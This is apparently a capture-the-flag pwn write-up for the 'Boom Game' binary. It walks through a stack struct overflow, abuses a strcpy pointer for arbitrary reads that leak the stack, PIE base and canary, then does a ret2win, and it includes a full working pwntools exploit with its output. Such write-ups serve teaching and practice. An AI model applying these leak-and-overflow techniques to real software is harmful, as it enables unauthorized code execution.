# Boom Game — Pwn Writeup
## Author : afk-Yato (facelesspwner)

## Overview

| | |
|---|---|
| **Challenge** | Boom Game ("welcome to your childhood game" — FizzBuzz-style counting game) |
| **Category** | Pwn / Stack + Struct abuse |
| **Binary** | `chall` — ELF 64-bit, PIE, not stripped (full source in `chall.c`) |
| **Flag** | `flag{faceless_pwner}` |

```
$ checksec chall
    PIE      : YES
    RELRO    : FULL
    NX       : ENABLED
    Canary   : YES
```

## The Program

It's a 30-round counting game ("your childhood game" = counting/Bizz-Buzz). Every 5th round the correct answer is `"boom"`, otherwise it's the round number.

```c
void win(){
    system("cat flag.txt");
}

struct frame {
    char input[16];
    char number_buf[16];
    char *correct;   // what the answer should be
    char *dest;      // where strcpy writes it
};

void challenge() {
    struct frame f;
    for (int i = 1; i <= 30; i++) {
        if (i % 5 == 0) f.correct = "boom";
        else { snprintf(f.number_buf, 16, "%d", i); f.correct = f.number_buf; }

        printf("[%d] > ", i);
        read(0, f.input, 0x50);            // <-- reads 0x50 into a 0x30-byte struct
        printf("You said: %s\n", f.input);
        f.input[15] = 0;
        f.dest = f.input;
        strcpy(f.dest, f.correct);         // <-- arbitrary copy gadget
        printf("Correct: %s\n", f.dest);
    }
}
```

Compiled layout (verified in the disassembly of `challenge` @ `0x11bf`):

```
rbp-0x40  f.input[16]
rbp-0x30  f.number_buf[16]
rbp-0x20  f.correct   (8)
rbp-0x18  f.dest      (8)
rbp-0x08  stack canary
rbp+0x00  saved rbp
rbp+0x08  return address (into main)
```

`win()` is at `0x11a9` (PIE-relative).

## The Bugs

1. **Stack overflow**: `read(0, f.input, 0x50)` writes 80 bytes into a 48-byte struct — enough to reach the canary, saved rbp and return address.
2. **Arbitrary read via `strcpy`**: after every read, the program does `f.dest = f.input; strcpy(f.dest, f.correct);` — but we control **`f.correct`** through the overflow. So each round we can make the program `strcpy` from *any address* into `f.input`, then print it with `printf("Correct: %s\n", f.dest)`. That's a clean **arbitrary read** primitive that survives the `f.input[15] = 0` truncation.
3. `printf("You said: %s\n", f.input)` leaks whatever sits right after our input when we don't NUL-terminate — the first stack leak.

## Exploit Strategy

We need three things: a **stack address**, the **PIE base** (return address value), and the **canary** — then a plain ret2win with the overflow.

### 1. Stack leak (round 1)

Send `32 * b"A"` (no newline/terminator). `input` + `number_buf` are filled, and `printf("You said: %s")` runs past them and prints the **uninitialized value stored in `f.correct`** — which happens to be a stack pointer. Empirically the leaked pointer `stack` satisfies:

```
&f.input       = stack - 0x10
&saved_rip     = stack + 0x38
```

### 2. PIE leak (round 2) — arbitrary read

```python
payload = b"A"*32 + p64(saved_rip_addr)   # overwrite f.correct
```

The program then does `strcpy(f.input, &saved_rip)` and prints it: **`Correct: <saved rip>`**.
The saved return address lives inside `main` (right after the `call challenge`), and `win = saved_rip - 0x187` (verified: saved rip lands in `main+0x71`, `win` at `0x11a9`).

### 3. Canary leak (round 3) — arbitrary read, skipping the null byte

The canary's LSB is `\x00`, so point `f.correct` one byte *past* its start:

```python
payload = b"A"*32 + p64(saved_rip_addr - 0x10 + 1)  # -> &canary + 1
```

`strcpy` copies the 7 non-null canary bytes; parse with a leading `\x00`:

```python
canary = u64(b"\x00" + p.recvn(7))
```

### 4. Ret2win (round 4) — full overflow

```python
payload  = b"A"*32                       # input + number_buf
payload += p64(saved_rip_addr - 0x10+1)  # f.correct (this round's strcpy target, harmless)
payload += b"whatever"*2                 # f.dest + 8 bytes padding
payload += p64(canary)                   # restore canary
payload += b"somejunk"                   # saved rbp
payload += p64(win_addr + 1)             # return address -> win+1
```

`win+1` skips the `push rbp` at `win` — this fixes the 16-byte stack alignment so `system("cat flag.txt")` (and its SSE instructions) don't crash on `movaps`.

Then just idle through the remaining 26 rounds (`send(b"A")` each) until `challenge()` returns into `win`.

## Final Exploit

```python
from pwn import *
context.log_level = 'error'
p = process("./chall", env={})

def heck(pay):
    p.recvuntil(b">")
    p.send(pay)

# --- 1. stack leak ---
p.recvuntil(b">")
p.send(b"A"*32)
p.recvuntil(b"A"*32)
stack = u64(p.recvn(6).ljust(8, b"\x00"))
saved_rip_addr = stack + 0x38
log.success(f"stack leak      : {hex(stack)}")

# --- 2. PIE leak (arbitrary read of saved rip) ---
heck(b"A"*32 + p64(saved_rip_addr))
p.recvuntil(b"Correct: ")
saved_rip = u64(p.recvn(6).ljust(8, b"\x00"))
win_addr  = saved_rip - 0x187
log.success(f"win             : {hex(win_addr)}")

# --- 3. canary leak (arbitrary read, skip null LSB) ---
heck(b"A"*32 + p64(saved_rip_addr - 0x10 + 1))
p.recvuntil(b"Correct: ")
canary = u64(p.recvn(7).rjust(8, b"\x00"))
log.success(f"canary          : {hex(canary)}")

# --- 4. ret2win ---
payload  = b"A"*32
payload += p64(saved_rip_addr - 0x10 + 1)
payload += b"whatever"*2
payload += p64(canary)
payload += b"somejunk"
payload += p64(win_addr + 1)
heck(payload)

for _ in range(26):          # ride out the remaining rounds
    heck(b"A")

p.recvuntil(b"boom\n")
print(p.recvall(timeout=2))  # flag{faceless_pwner}
```

```
[+] stack leak      : 0x7fffc6c44730
[+] saved rip       : 0x557bc1fc3330
[+] win             : 0x557bc1fc31a9
[+] canary          : 0xadecf4e99c4bac00
b'flag{faceless_pwner}\n'
```

## Notes / Takeaways

* Overflowing a **struct on the stack** is much more than a linear smash: overwriting struct *pointer members* (`f.correct`) turned a vanilla overflow into an **arbitrary read**, which defeats PIE and the canary without any libc involvement.
* The program "helpfully" does `f.dest = f.input` fresh every iteration — so only `f.correct` needs to be controlled; the copy destination is always the (leakable) input buffer.
* `win+1` (skipping `push rbp`) is the classic one-gadget alignment fix for `system` in a no-PIE/PIE ret2win.
* Never terminate your leak payloads — `%s` prints up to the NUL, and the untouched bytes behind your input are usually pointers.
